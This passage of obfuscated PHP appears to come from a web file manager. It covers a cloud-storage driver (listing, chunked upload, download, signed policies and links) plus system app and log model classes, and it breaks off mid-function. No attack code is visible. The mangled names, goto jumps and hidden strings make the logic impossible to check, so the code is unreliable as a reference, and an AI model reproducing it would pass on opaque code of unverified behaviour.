($FéÂğ¥† [$Fåô‡Á•¨[39]] == $Fåô‡Á•¨[88]) { $Eˆ»¸³Ú¢[] = $this->folderInfo($Aó·™õ×Ç . $FéÂğ¥† [$Fåô‡Á•¨[38]], $bé¾ÆºœÄ•, $FéÂğ¥† ); } else { $fµ×Õ±ÈâÜ[] = $this->fileInfo($Aó·™õ×Ç . $FéÂğ¥† [$Fåô‡Á•¨[38]], $bé¾ÆºœÄ•, $FéÂğ¥† ); } } if (count($A¬‹¯Œäº¿) < $EŠøÄ“½Ğ‹) { break; } } goto Côå˜ù‡´ù; dæÃ—Øï„: } private function recursionAllFiles($EÒ—¥¨¯×, &$aŠ¡ãÓªÎŒ) { $f¹¹Ã×ºË” =& $_SERVER[¹÷ˆ§éÒ°ú]; $fá»œËÙÙğ = $f¹¹Ã×ºË”[43]; $féÔ “ÂÙ = 1000; $cÎˆÔˆœšÖ = $C‹ó™¤ ²í = array(); $AâØ¶Ş“Àè = rtrim($EÒ—¥¨¯×, $f¹¹Ã×ºË”[18]) . $f¹¹Ã×ºË”[18]; while (!0) { $CíŒŒ‡‘·Ä = $this->fileList($EÒ—¥¨¯×, $fá»œËÙÙğ, $féÔ “ÂÙ); if (!$CíŒŒ‡‘·Ä) { return !1; } $fá»œËÙÙğ = isset($CíŒŒ‡‘·Ä[$f¹¹Ã×ºË”[1249]]) ? $CíŒŒ‡‘·Ä[$f¹¹Ã×ºË”[1249]] : $f¹¹Ã×ºË”[43]; $D¼©Á‚î¼± = isset($CíŒŒ‡‘·Ä[$f¹¹Ã×ºË”[1250]]) ? $CíŒŒ‡‘·Ä[$f¹¹Ã×ºË”[1250]] : array(); foreach ($D¼©Á‚î¼± as $Aò…Ì´‡ĞÄ) { $A™ÈÇš–Ù = array($f¹¹Ã×ºË”[87] => $AâØ¶Ş“Àè . $Aò…Ì´‡ĞÄ[$f¹¹Ã×ºË”[38]], $f¹¹Ã×ºË”[88] => $Aò…Ì´‡ĞÄ[$f¹¹Ã×ºË”[39]] == $f¹¹Ã×ºË”[88] ? 1 : 0, $f¹¹Ã×ºË”[89] => isset($Aò…Ì´‡ĞÄ[$f¹¹Ã×ºË”[336]]) ? $Aò…Ì´‡ĞÄ[$f¹¹Ã×ºË”[336]] : 0); $aŠ¡ãÓªÎŒ[] = $A™ÈÇš–Ù; if ($A™ÈÇš–Ù[$f¹¹Ã×ºË”[88]] == 1) { $this->recursionAllFiles($A™ÈÇš–Ù[$f¹¹Ã×ºË”[87]], $aŠ¡ãÓªÎŒ); } } if (count($D¼©Á‚î¼±) < $féÔ “ÂÙ) { break; } } } public function has($B‰·ŠÉï„Û, $dùÍ¸Õé = false, $CŸåì÷÷ù = true) { goto Cğİñ¦È‚ó; cÌÍ„Ìö§²: while (!0) { $f¨÷¼ïÉÏ = $this->fileList($B‰·ŠÉï„Û, $aø œº¢¥«, $f•¡…àĞÙÎ); if (!$f¨÷¼ïÉÏ) { return !1; } $aø œº¢¥« = isset($f¨÷¼ïÉÏ[$b‹—‡éòÔê[1249]]) ? $f¨÷¼ïÉÏ[$b‹—‡éòÔê[1249]] : $b‹—‡éòÔê[43]; $eÌ˜ñìÇ‘ô = isset($f¨÷¼ïÉÏ[$b‹—‡éòÔê[1250]]) ? $f¨÷¼ïÉÏ[$b‹—‡éòÔê[1250]] : array(); if (empty($eÌ˜ñìÇ‘ô)) { break; } $Fé•ö»ĞÍŒ = array_to_keyvalue($eÌ˜ñìÇ‘ô, $b‹—‡éòÔê[43], $b‹—‡éòÔê[39]); $b…é¿à‚²Ø = array_count_values($Fé•ö»ĞÍŒ); $AÆ²äğ°• = isset($b…é¿à‚²Ø[$b‹—‡éòÔê[88]]) ? $b…é¿à‚²Ø[$b‹—‡éòÔê[88]] : 0; $d¾øìù†İ = count($Fé•ö»ĞÍŒ) - $AÆ²äğ°•; if ($dùÍ¸Õé) { $Böï‹¼œÆœ += $AÆ²äğ°•; $bÏ×Ùœ¾ùÖ += $d¾øìù†İ; if ($bØ¼Ó‹˜º¹ < $f•¡…àĞÙÎ) { break; } continue; } if ($CŸåì÷÷ù) { if ($d¾øìù†İ) { return !0; } } else { if ($AÆ²äğ°•) { return !0; } } if (count($eÌ˜ñìÇ‘ô) < $f•¡…àĞÙÎ) { break; } } if ($dùÍ¸Õé) { return array($b‹—‡éòÔê[203] => $bÏ×Ùœ¾ùÖ, $b‹—‡éòÔê[204] => $Böï‹¼œÆœ); } return !1; goto C£‚Êİ‰¡ù; Cğİñ¦È‚ó: $b‹—‡éòÔê =& $_SERVER[¹÷ˆ§éÒ°ú]; $aø œº¢¥« = $b‹—‡éòÔê[43]; $f•¡…àĞÙÎ = 1000; goto b¼ïä¶õËß; b¼ïä¶õËß: $bÏ×Ùœ¾ùÖ = 0; $Böï‹¼œÆœ = 0; $FİÏ‰¿‚¯â = rtrim($B‰·ŠÉï„Û, $b‹—‡éòÔê[18]) . $b‹—‡éòÔê[18]; goto cÌÍ„Ìö§²; C£‚Êİ‰¡ù: } public function listAll($FĞ·È¬›´Ş) { $B»¨ÜÕóĞï = array(); $this->recursionAllFiles($FĞ·È¬›´Ş, $B»¨ÜÕóĞï); return $B»¨ÜÕóĞï; } public function canRead($a•È³ÊæÇ) { return $this->exist($a•È³ÊæÇ) ? !0 : !1; } public function canWrite($BÎ¡Ğ¨ôéœ) { return $this->exist($BÎ¡Ğ¨ôéœ) ? !0 : !1; } public function getContent($eÑÅÓÈñáã) { return $this->fileSubstr($eÑÅÓÈñáã, 0, -1); } public function setContent($AèöŠæØ†š, $D³âì–ª˜¥ = '') { $A¬©”§¡ø³ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$D³âì–ª˜¥) { $E»âÜÅ»½ï = $this->ussRequest($AèöŠæØ†š, $A¬©”§¡ø³[224]); return $E»âÜÅ»½ï[$A¬©”§¡ø³[1023]]; } $cÄë‘™Üø¬ = $this->tempFile($this->pathThis($AèöŠæØ†š)); file_put_contents($cÄë‘™Üø¬, $D³âì–ª˜¥); if ($this->upload($AèöŠæØ†š, $cÄë‘™Üø¬)) { $this->tempFileRemve($cÄë‘™Üø¬); return !0; } return !1; } public function fileSubstr($b÷öñ‡…‡‹, $e„ààå¾Õ¨, $fìó•Ñˆ‚÷) { $D‡æ™‡‘Éî =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!($Dòç¾…Ë’Ç = $this->link($b÷öñ‡…‡‹))) { return !1; } $d’°À‰ˆî = !1; if ($fìó•Ñˆ‚÷ > 0) { $b½—Ê ¸ˆ = $e„ààå¾Õ¨ + $fìó•Ñˆ‚÷ - 1; $d’°À‰ˆî = array($D‡æ™‡‘Éî[1211] . $e„ààå¾Õ¨ . $D‡æ™‡‘Éî[423] . $b½—Ê ¸ˆ); } $EÀÊ™”¯ê = url_request($Dòç¾…Ë’Ç, $D‡æ™‡‘Éî[228], !1, $d’°À‰ˆî); return $EÀÊ™”¯ê[$D‡æ™‡‘Éî[684]] ? $EÀÊ™”¯ê[$D‡æ™‡‘Éî[1025]] : !1; } public function upload($Fº¡°Ì, $c £¤ê¹†Ò, $B”ø°¥ŠËë = false, $Bğ…Ëº°ï = REPEAT_REPLACE) { goto f«Å´•ÏÔ¦; EîÑäìİÊÂ: $cóéëíùÚ¦ = 1024 * 1024 * 10; $Dã¸ Ğ†ˆö = array($Eˆ¿°ƒĞÒ«[1252], $Eˆ¿°ƒĞÒ«[1253] . $AŒöºòñéĞ, $Eˆ¿°ƒĞÒ«[1254], $Eˆ¿°ƒĞÒ«[1255] . $cóéëíùÚ¦); $e•ÌµÇÆ¤ = $this->ussRequest($Fº¡°Ì, $Eˆ¿°ƒĞÒ«[226], !1, $Dã¸ Ğ†ˆö); goto Dë·‘Ú÷„…; FÜ·åƒÚ…Á: $e•ÌµÇÆ¤ = $this->ussRequest($Fº¡°Ì, $Eˆ¿°ƒĞÒ«[226], !1, $Dã¸ Ğ†ˆö); return $e•ÌµÇÆ¤[$Eˆ¿°ƒĞÒ«[1023]] ? $this->getPathOuter($e›–¹Ã™ç) : !1; goto aìÌø™°­Ö; Dë·‘Ú÷„…: if (!$e•ÌµÇÆ¤[$Eˆ¿°ƒĞÒ«[1023]]) { return !1; } $Cœ§ŒòíÑ = $e•ÌµÇÆ¤[$Eˆ¿°ƒĞÒ«[1025]]; $cßÉÔÍ™œ· = 0; goto fì¥­ğÃá; F¾¥Éê„††: do { $DÀÍŸƒÀó„ = $Cœ§ŒòíÑ[$Eˆ¿°ƒĞÒ«[1257]]; fseek($bÆÏ°‘ŞŒÇ, $cßÉÔÍ™œ·); $FÁÕ›®‰•® = fread($bÆÏ°‘ŞŒÇ, $DÀÍŸƒÀó„); $cË“ÉİÊšŞ = 0; do { $cË“ÉİÊšŞ++; $Cœ§ŒòíÑ = $this->uploadPart($Fº¡°Ì, $Cœ§ŒòíÑ, $FÁÕ›®‰•®); } while (!$Cœ§ŒòíÑ && $cË“ÉİÊšŞ < 3); if (!$Cœ§ŒòíÑ) { return !1; } $D®†³³ˆ–Û = $Cœ§ŒòíÑ[$Eˆ¿°ƒĞÒ«[1256]]; $cßÉÔÍ™œ· += $DÀÍŸƒÀó„; } while ($D®†³³ˆ–Û != -1); fclose($bÆÏ°‘ŞŒÇ); $Dã¸ Ğ†ˆö = array($Eˆ¿°ƒĞÒ«[1258], $Eˆ¿°ƒĞÒ«[1259] . $Cœ§ŒòíÑ[$Eˆ¿°ƒĞÒ«[1260]], $Eˆ¿°ƒĞÒ«[1254]); goto FÜ·åƒÚ…Á; fì¥­ğÃá: $D®†³³ˆ–Û = $Cœ§ŒòíÑ[$Eˆ¿°ƒĞÒ«[1256]]; $bÆÏ°‘ŞŒÇ = fopen($c £¤ê¹†Ò, $Eˆ¿°ƒĞÒ«[1161]); if (!$bÆÏ°‘ŞŒÇ) { return !1; } goto F¾¥Éê„††; f«Å´•ÏÔ¦: $Eˆ¿°ƒĞÒ« =& $_SERVER[¹÷ˆ§éÒ°ú]; $AŒöºòñéĞ = IO::size($c £¤ê¹†Ò); if ($AŒöºòñéĞ <= 1024 * 1024 * 200) { $f¨—‘ÒßŒ = array($Eˆ¿°ƒĞÒ«[1251] . $c £¤ê¹†Ò); $e•ÌµÇÆ¤ = $this->ussRequest($Fº¡°Ì, $Eˆ¿°ƒĞÒ«[226], $f¨—‘ÒßŒ); return $e•ÌµÇÆ¤[$Eˆ¿°ƒĞÒ«[1023]] ? $this->getPathOuter($Fº¡°Ì) : !1; } goto EîÑäìİÊÂ; aìÌø™°­Ö: } private function uploadPart($a¡°‘ò”®¬, $BŒÑßŒ¯à, &$cëÉë¤ÃÕë) { $E´²Öö˜—¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fç²°•öÕ° = array($E´²Öö˜—¡[1261], $E´²Öö˜—¡[1259] . $BŒÑßŒ¯à[$E´²Öö˜—¡[1260]], $E´²Öö˜—¡[1262] . $BŒÑßŒ¯à[$E´²Öö˜—¡[1256]], $E´²Öö˜—¡[150] . $BŒÑßŒ¯à[$E´²Öö˜—¡[1257]]); $Fğ©»éªš÷ = $this->ussRequest($a¡°‘ò”®¬, $E´²Öö˜—¡[226], $cëÉë¤ÃÕë, $fç²°•öÕ°); return !$Fğ©»éªš÷[$E´²Öö˜—¡[1023]] ? $Fğ©»éªš÷[$E´²Öö˜—¡[1023]] : $Fğ©»éªš÷[$E´²Öö˜—¡[1025]]; } public function uploadFormData($D¹ÚÜÂƒÏ, $A‚©ä£‹¹ó = 3600) { return $this->uploadPolicy($D¹ÚÜÂƒÏ, $A‚©ä£‹¹ó); } public function multiUploadFormData($C‰±»Úˆº÷, $D´ŠÍÓÕŸ¢ = 3600) { $BÔí¶Ş¦Õ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F—Ê„ò’¼ì = (int) $GLOBALS[$BÔí¶Ş¦Õ[17]][$BÔí¶Ş¦Õ[89]]; return $this->uploadPolicy($C‰±»Úˆº÷, $D´ŠÍÓÕŸ¢, $F—Ê„ò’¼ì); } private function uploadPolicy($AÙĞ»»ÇÒ¾, $eÎŒ”¿‡‹ = 3600, $EéÎµæíÃ¬ = 0) { goto A…ƒàâá»‚; b¹Šë§ò–: $BÏğ˜÷Õº = base64_encode(hash_hmac($E àª¡‰ÀÁ[1233], "\120\x4f\123\124\46{$dØÃ‹“‹Š¼}\x26{$A«ñ”è’}\46{$C‡ ¬ğèÍà}", md5("{$this->userpass}"), !0)); $bÍôçÃ‚óÇ = array($E àª¡‰ÀÁ[1103] => $C‡ ¬ğèÍà, $E àª¡‰ÀÁ[1267] => "\x55\x50\x59\125\116\x20{$this->username}\72{$BÏğ˜÷Õº}", $E àª¡‰ÀÁ[181] => $this->endpoint . $dØÃ‹“‹Š¼); return $bÍôçÃ‚óÇ; goto D‰×±šÎ; A…ƒàâá»‚: $E àª¡‰ÀÁ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dØÃ‹“‹Š¼ = $E àª¡‰ÀÁ[18] . $this->bucket; $A«ñ”è’ = gmdate($E àª¡‰ÀÁ[1196]); goto d«Ï¥‰ÜíÒ; d«Ï¥‰ÜíÒ: $e˜ºÆŠ´§­ = array($E àª¡‰ÀÁ[1263] => $this->bucket, $E àª¡‰ÀÁ[1264] => $AÙĞ»»ÇÒ¾, $E àª¡‰ÀÁ[1265] => time() + $eÎŒ”¿‡‹, $E àª¡‰ÀÁ[1266] => $A«ñ”è’); if ($EéÎµæíÃ¬) { $e˜ºÆŠ´§­[$E àª¡‰ÀÁ[1182]] = $EéÎµæíÃ¬; } $C‡ ¬ğèÍà = base64_encode(json_encode($e˜ºÆŠ´§­)); goto b¹Šë§ò–; D‰×±šÎ: } public function download($eÒùÆÏ§”, $DñŸ‘ö²œ‘) { goto Aïœõæ²¥•; Aïœõæ²¥•: $bßÂ´¨æ»ç = IO::getPathInner(IO::mkfile($DñŸ‘ö²œ‘)); if (!($d¨ˆ§ì¿ = $this->link($eÒùÆÏ§”))) { return !1; } $f‰«š½ŸİŒ = 0; goto Få²£É®Ï˜; c¶é°Šø‰à: fclose($d½ÇÙ®­»æ); return $DñŸ‘ö²œ‘; goto Fİéä‚½¼; Få²£É®Ï˜: $Bæå•†¸Üã = 1024 * 200; $d½ÇÙ®­»æ = fopen($bßÂ´¨æ»ç, $_SERVER[¹÷ˆ§éÒ°ú][1217]); while (!0) { $eÚ·Œ‰…†Ì = $this->fileSubstr($eÒùÆÏ§”, $f‰«š½ŸİŒ, $Bæå•†¸Üã); if ($eÚ·Œ‰…†Ì === !1) { return !1; } fwrite($d½ÇÙ®­»æ, $eÚ·Œ‰…†Ì); $f‰«š½ŸİŒ += $Bæå•†¸Üã; if (strlen($eÚ·Œ‰…†Ì) < $Bæå•†¸Üã) { break; } } goto c¶é°Šø‰à; Fİéä‚½¼: } public function link($AŠÚÜ´©¶Ë, $c¼×‘ğ‘ˆô = array()) { $d«‚ÈºØ¦ï =& $_SERVER[¹÷ˆ§éÒ°ú]; $AŠÚÜ´©¶Ë = trim($AŠÚÜ´©¶Ë, $d«‚ÈºØ¦ï[18]); if (!empty($this->token)) { $f³ÈàÌÁ½Ğ = strtotime(date($d«‚ÈºØ¦ï[1268])); $eğÜ’ÁÆì = substr(md5($this->token . $d«‚ÈºØ¦ï[283] . $f³ÈàÌÁ½Ğ . $d«‚ÈºØ¦ï[1269] . $AŠÚÜ´©¶Ë), 12, 8) . $f³ÈàÌÁ½Ğ; $c¼×‘ğ‘ˆô[] = $d«‚ÈºØ¦ï[1270] . $eğÜ’ÁÆì; } $FÛğáùïò¬ = !empty($c¼×‘ğ‘ˆô) ? $d«‚ÈºØ¦ï[81] . implode($d«‚ÈºØ¦ï[283], $c¼×‘ğ‘ˆô) : $d«‚ÈºØ¦ï[43]; return $this->getHost() . $d«‚ÈºØ¦ï[18] . $AŠÚÜ´©¶Ë . $FÛğáùïò¬; } public function fileOut($FØ¬âÛíõ, $BƒÊ§†ÏõÌ = false, $bŠÓœƒİ’¹ = false, $a“î„ØÊâ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($FØ¬âÛíõ, $BƒÊ§†ÏõÌ, $bŠÓœƒİ’¹, $a“î„ØÊâ); } if (!$bŠÓœƒİ’¹) { $bŠÓœƒİ’¹ = $this->pathThis($FØ¬âÛíõ); } $aîÀ—†»ê¦ = $BƒÊ§†ÏõÌ ? array($_SERVER[¹÷ˆ§éÒ°ú][1271] . rawurlencode($bŠÓœƒİ’¹)) : array(); $cĞïì…‹ø = $this->link($FØ¬âÛíõ, $aîÀ—†»ê¦); $this->fileOutLink($cĞïì…‹ø); } public function fileOutServer($FÁ‚«’Ê˜, $FîêÑ¬ÛêŸ = false, $e¥ã¸ÁÁÎ = false, $D§æÙÙíµæ = '') { parent::fileOut($FÁ‚«’Ê˜, $FîêÑ¬ÛêŸ, $e¥ã¸ÁÁÎ, $D§æÙÙíµæ); } public function fileOutImage($E©„˜§­œ, $b…öÏİ÷¼˜ = 250) { $E’ãØœ·é = $this->link($E©„˜§­œ . $_SERVER[¹÷ˆ§éÒ°ú][1272] . $b…öÏİ÷¼˜); $this->fileOutLink($E’ãØœ·é); } public function fileOutImageServer($Fğ‡¸ŞÓÏ, $EàØ¾—ç = 250) { parent::fileOutImage($Fğ‡¸ŞÓÏ, $EàØ¾—ç); } public function hashMd5($BŸŒÜ†ä ’) { $e½ÂÁ¤Œ­ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c¬ëÔ»òÕÒ = $this->objectMeta($BŸŒÜ†ä ’); return isset($c¬ëÔ»òÕÒ[$e½ÂÁ¤Œ­[208]]) ? $c¬ëÔ»òÕÒ[$e½ÂÁ¤Œ­[208]] : !1; } public function size($Dª×–Ù™œÆ) { $f……—â¨®À = $this->objectMeta($Dª×–Ù™œÆ); return $f……—â¨®À ? $f……—â¨®À[$_SERVER[¹÷ˆ§éÒ°ú][89]] : 0; } public function info($c‚‹åõºÊ) { if ($this->isFolder($c‚‹åõºÊ)) { return $this->folderInfo($c‚‹åõºÊ); } else { if ($this->isFile($c‚‹åõºÊ)) { return $this->fileInfo($c‚‹åõºÊ); } } return !1; } public function exist($AŞ·Á«») { return $this->isFile($AŞ·Á«») || $this->isFolder($AŞ·Á«»); } public function isFile($E×õ‚„Ò) { return !$this->isFolder($E×õ‚„Ò) && $this->objectMeta($E×õ‚„Ò); } public function isFolder($A ®ËÓˆËã) { return $this->cacheMethod($_SERVER[¹÷ˆ§éÒ°ú][234], $A ®ËÓˆËã); } protected function objectMeta($B†Ï Íö‚) { return $this->cacheMethod($_SERVER[¹÷ˆ§éÒ°ú][235], $B†Ï Íö‚); } protected function _objectMeta($AôÔâç¸Ö¥) { goto AºÌ¦±™âè; BÍ¹ëÛ‹…÷: $C…Šª¶Óù = array($D†ÅÑœ·Å[38] => get_path_this($AôÔâç¸Ö¥), $D†ÅÑœ·Å[39] => isset($d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1274]]) ? $d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1274]] : null, $D†ÅÑœ·Å[89] => isset($d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1275]]) ? $d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1275]] : null, $D†ÅÑœ·Å[208] => isset($d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1276]]) ? $d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1276]] : null, $D†ÅÑœ·Å[1244] => isset($d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1277]]) ? $d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1277]] : null); $C…Šª¶Óù[$D†ÅÑœ·Å[1245]] = isset($d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1278]]) ? strtotime($d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1278]]) : $C…Šª¶Óù[$D†ÅÑœ·Å[1244]]; return $C…Šª¶Óù; goto BõÛÑ×ñù«; AºÌ¦±™âè: $D†ÅÑœ·Å =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($AôÔâç¸Ö¥ == $D†ÅÑœ·Å[43] || $AôÔâç¸Ö¥ == $D†ÅÑœ·Å[18]) { return array(); } $fÌ†á²‚‚² = $this->ussRequest($AôÔâç¸Ö¥, $D†ÅÑœ·Å[1273]); goto Cšéé±¨½Ê; Cšéé±¨½Ê: if (!$fÌ†á²‚‚²[$D†ÅÑœ·Å[1023]]) { return null; } $d÷éÅ‹¿•¶ = isset($fÌ†á²‚‚²[$D†ÅÑœ·Å[1025]]) ? $fÌ†á²‚‚²[$D†ÅÑœ·Å[1025]] : array(); if (!isset($d÷éÅ‹¿•¶[$D†ÅÑœ·Å[1274]])) { return null; } goto BÍ¹ëÛ‹…÷; BõÛÑ×ñù«: } protected function _isFolder($FÙèÎíåŸ) { $føÒ—ª‘×Ä =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($FÙèÎíåŸ == $føÒ—ª‘×Ä[43] || $FÙèÎíåŸ == $føÒ—ª‘×Ä[18]) { return !0; } $E¼ÍêÔòóƒ = $this->objectMeta($FÙèÎíåŸ); return isset($E¼ÍêÔòóƒ[$føÒ—ª‘×Ä[39]]) && $E¼ÍêÔòóƒ[$føÒ—ª‘×Ä[39]] == $føÒ—ª‘×Ä[88] ? !0 : !1; } } goto b÷Œ†‡Æ¦; eÕ¤°Çğ·: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\114\151\x67\150\x74\x41\x70\x70"; public $modelType = "\x53\171\163\x74\x65\155\x4f\160\x74\151\157\156"; public $field = array("\x6e\141\155\145", "\x67\x72\x6f\165\x70", "\x64\145\163\x63", "\x63\157\x6e\164\145\156\x74"); public function listData($Dœêñª¾ = false, $DïùÈÕÄ = "\155\x6f\144\x69\x66\171\x54\x69\x6d\x65", $FÑ·øÌ§×Š = true) { return parent::listData($Dœêñª¾, $DïùÈÕÄ, $FÑ·øÌ§×Š); } public function remove($B÷Ì‰‰ê) { $Fº¼Öõ·„‘ = $this->findByName($B÷Ì‰‰ê); if (!$Fº¼Öõ·„‘) { return !1; } return parent::remove($Fº¼Öõ·„‘[$_SERVER[¹÷ˆ§éÒ°ú][378]]); } public function add($C¤ôª¦Ã–ç) { if ($this->findByName($C¤ôª¦Ã–ç[$_SERVER[¹÷ˆ§éÒ°ú][38]])) { return !1; } return parent::insert($C¤ôª¦Ã–ç); } public function update($DŞ®ÂÂÑÇê, $FÀ‹‰àÃëŒ) { $CÎŠÛŠ°Ç± =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¢´…•–È… = $this->findByName($DŞ®ÂÂÑÇê); $a—ÁßÊÌôË = $this->findByName($FÀ‹‰àÃëŒ[$CÎŠÛŠ°Ç±[38]]); if (!$B¢´…•–È… || $a—ÁßÊÌôË && $a—ÁßÊÌôË[$CÎŠÛŠ°Ç±[378]] != $B¢´…•–È…[$CÎŠÛŠ°Ç±[378]]) { return !1; } return parent::update($B¢´…•–È…[$CÎŠÛŠ°Ç±[378]], $FÀ‹‰àÃëŒ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\x6d\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\x69\155\145", "\164\x69\x6d\145", "\151\x6e\x73\x65\162\x74", "\x66\165\x6e\x63\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $B“ä¿áÄÌ‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; return array($B“ä¿áÄÌ‰[2390] => LNG($B“ä¿áÄÌ‰[2391]), $B“ä¿áÄÌ‰[2392] => LNG($B“ä¿áÄÌ‰[2393]), $B“ä¿áÄÌ‰[2037] => LNG($B“ä¿áÄÌ‰[2394]), $B“ä¿áÄÌ‰[2395] => LNG($B“ä¿áÄÌ‰[2396]), $B“ä¿áÄÌ‰[2397] => LNG($B“ä¿áÄÌ‰[2398]), $B“ä¿áÄÌ‰[2399] => LNG($B“ä¿áÄÌ‰[2400]), $B“ä¿áÄÌ‰[2401] => LNG($B“ä¿áÄÌ‰[2402]), $B“ä¿áÄÌ‰[2403] => LNG($B“ä¿áÄÌ‰[2404]), $B“ä¿áÄÌ‰[2068] => LNG($B“ä¿áÄÌ‰[2405]), $B“ä¿áÄÌ‰[2069] => LNG($B“ä¿áÄÌ‰[2406]), $B“ä¿áÄÌ‰[2407] => LNG($B“ä¿áÄÌ‰[2408]), $B“ä¿áÄÌ‰[2409] => LNG($B“ä¿áÄÌ‰[2410]), $B“ä¿áÄÌ‰[2411] => LNG($B“ä¿áÄÌ‰[2412]), $B“ä¿áÄÌ‰[2413] => LNG($B“ä¿áÄÌ‰[2414]), $B“ä¿áÄÌ‰[2066] => LNG($B“ä¿áÄÌ‰[2415]), $B“ä¿áÄÌ‰[2073] => LNG($B“ä¿áÄÌ‰[2416]), $B“ä¿áÄÌ‰[2417] => LNG($B“ä¿áÄÌ‰[2418]), $B“ä¿áÄÌ‰[2419] => LNG($B“ä¿áÄÌ‰[2420]), $B“ä¿áÄÌ‰[2421] => LNG($B“ä¿áÄÌ‰[2422]), $B“ä¿áÄÌ‰[2423] => LNG($B“ä¿áÄÌ‰[2424]), $B“ä¿áÄÌ‰[2076] => LNG($B“ä¿áÄÌ‰[2425]), $B“ä¿áÄÌ‰[2077] => LNG($B“ä¿áÄÌ‰[2426]), $B“ä¿áÄÌ‰[2427] => LNG($B“ä¿áÄÌ‰[2428]), $B“ä¿áÄÌ‰[2429] => LNG($B“ä¿áÄÌ‰[2430]), $B“ä¿áÄÌ‰[2431] => LNG($B“ä¿áÄÌ‰[2432]), $B“ä¿áÄÌ‰[2071] => LNG($B“ä¿áÄÌ‰[2433]), $B“ä¿áÄÌ‰[2434] => LNG($B“ä¿áÄÌ‰[2435]), $B“ä¿áÄÌ‰[2070] => LNG($B“ä¿áÄÌ‰[2436]), $B“ä¿áÄÌ‰[2437] => LNG($B“ä¿áÄÌ‰[2438]), $B“ä¿áÄÌ‰[2439] => LNG($B“ä¿áÄÌ‰[2440]), $B“ä¿áÄÌ‰[2441] => LNG($B“ä¿áÄÌ‰[2441]), $B“ä¿áÄÌ‰[2442] => LNG($B“ä¿áÄÌ‰[2041]), $B“ä¿áÄÌ‰[2443] => LNG($B“ä¿áÄÌ‰[2444]), $B“ä¿áÄÌ‰[2445] => LNG($B“ä¿áÄÌ‰[2446]), $B“ä¿áÄÌ‰[2447] => LNG($B“ä¿áÄÌ‰[2448]), $B“ä¿áÄÌ‰[2449] => LNG($B“ä¿áÄÌ‰[2450]), $B“ä¿áÄÌ‰[2451] => LNG($B“ä¿áÄÌ‰[2452]), $B“ä¿áÄÌ‰[2453] => LNG($B“ä¿áÄÌ‰[2453]), $B“ä¿áÄÌ‰[2454] => LNG($B“ä¿áÄÌ‰[2455]), $B“ä¿áÄÌ‰[2456] => LNG($B“ä¿áÄÌ‰[2457]), $B“ä¿áÄÌ‰[2458] => LNG($B“ä¿áÄÌ‰[2459]), $B“ä¿áÄÌ‰[2460] => LNG($B“ä¿áÄÌ‰[2461]), $B“ä¿áÄÌ‰[2462] => LNG($B“ä¿áÄÌ‰[2463]), $B“ä¿áÄÌ‰[2464] => LNG($B“ä¿áÄÌ‰[2465])); } private function typeFile() { $Fš½ÍŒ±áá =& $_SERVER[¹÷ˆ§éÒ°ú]; $Däö­¹¿ÒÏ = array($Fš½ÍŒ±áá[2073] => array($Fš½ÍŒ±áá[2074]), $Fš½ÍŒ±áá[2411] => array($Fš½ÍŒ±áá[2466]), $Fš½ÍŒ±áá[2413] => array($Fš½ÍŒ±áá[2467]), $Fš½ÍŒ±áá[2066] => array($Fš½ÍŒ±áá[2067]), $Fš½ÍŒ±áá[2419] => array(), $Fš½ÍŒ±áá[2421] => array(), $Fš½ÍŒ±áá[2423] => array(), $Fš½ÍŒ±áá[2076] => array($Fš½ÍŒ±áá[2078]), $Fš½ÍŒ±áá[2077] => array($Fš½ÍŒ±áá[2078]), $Fš½ÍŒ±áá[2427] => array($Fš½ÍŒ±áá[2468]), $Fš½ÍŒ±áá[2429] => array($Fš½ÍŒ±áá[2468]), $Fš½ÍŒ±áá[2431] => array($Fš½ÍŒ±áá[2469]), $Fš½ÍŒ±áá[2417] => array($Fš½ÍŒ±áá[2470]), $Fš½ÍŒ±áá[2071] => array($Fš½ÍŒ±áá[2471]), $Fš½ÍŒ±áá[2434] => array($Fš½ÍŒ±áá[2472]), $Fš½ÍŒ±áá[2070] => array($Fš½ÍŒ±áá[2072])); return $Däö­¹¿ÒÏ; } private function typeAll() { goto Dµ¤õÃ§Ï; Dµ¤õÃ§Ï: $e¤ë©¼¹æÊ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dË·®®Ğ•° = $this->typeList; $Dß»†Å« = array_filter($this->typeFile()); goto dò×®ƒîŞ…; dò×®ƒîŞ…: foreach ($Dß»†Å« as $fÅ„ÎŒÌæ => $cÕ¼ŒŞôã) { $dË·®®Ğ•°[$cÕ¼ŒŞôã[0]] = $dË·®®Ğ•°[$fÅ„ÎŒÌæ]; } $dË·®®Ğ•°[$e¤ë©¼¹æÊ[2078]] = LNG($e¤ë©¼¹æÊ[2473]); $dË·®®Ğ•°[$e¤ë©¼¹æÊ[2468]] = LNG($e¤ë©¼¹æÊ[2474]); goto Eğ‹„Ç¼­‚; Eğ‹„Ç¼­‚: return $dË·®®Ğ•°; goto d¸ÂÎ›‚‡Ù; d¸ÂÎ›‚‡Ù: } public function addLog($E‡¼å¨˜á, $cÌëƒå´Ç = array()) { goto fÂ²¥÷¤Ç¢; bÇÂ‰„•: $D‡‘šù ˆ = get_client_ip(); if (!$cÌëƒå´Ç || strlen(json_encode($cÌëƒå´Ç)) >= 1024) { 